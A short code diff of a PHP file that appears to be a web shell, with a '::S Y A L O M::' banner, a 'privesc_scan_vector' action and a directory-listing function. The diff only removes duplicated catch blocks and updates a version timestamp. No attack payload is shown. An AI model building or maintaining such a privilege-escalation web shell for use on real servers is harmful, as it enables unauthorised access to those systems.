@@ -1094,11 +1094,6 @@ if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan_vector') {
     } catch (Throwable $e) {
         $result['error'] = $e->getMessage();
     }
-    } catch (Exception $e) {
-        $result['error'] = 'Exception: ' . $e->getMessage();
-    } catch (Throwable $t) {
-        $result['error'] = 'Error: ' . $t->getMessage();
-    }
     
     safe_json_output($result);
 }
@@ -3109,7 +3104,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::S Y A L O M:: ~ 280326 1648</h1>
+        <h1>::S Y A L O M:: ~ 280326 1651</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
